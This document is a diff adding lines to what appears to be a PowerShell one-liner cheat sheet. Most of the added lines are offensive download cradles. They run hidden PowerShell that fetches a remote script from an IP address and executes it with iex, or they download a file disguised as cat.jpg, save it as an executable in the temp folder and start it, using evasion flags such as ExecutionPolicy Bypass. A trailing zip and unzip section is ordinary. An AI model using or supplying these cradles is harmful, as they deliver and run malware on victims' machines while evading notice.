@@ -11,6 +11,13 @@ powershell.exe "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass 
 iex(iwr -Uri http://192.168.13.241/calc.ps1 -UseBasicParsing)
 // cmd.exe /c calc.exe > calc.ps1
 
+powershell -nop -w hidden -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.x.x:8081/test.ps1')"
+// Start-Process 'C:\windows\system32\calc.exe' > test.ps1
+
+# Download, Save and Exec
+PowerShell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://192.168.x.x:8081/cat.jpg','%temp%\putty.exe'); Start-Process '%temp%\putty.exe'
+PowerShell -windowstyle hidden -ExecutionPolicy ByPass -NoProfile Start-BitsTransfer -Source http://192.168.x.x:8081/cat.jpg -Destination $env:temp\cat.exe; Start-Process $env:temp\cat.exe
+
 # Zip and Unzip
 powershell Compress-Archive C:\Users\u101\file1 C:\Users\u101\file1.zip
 powershell expand-archive C:\Users\u101\file1.zip C:\Users\u101\file1
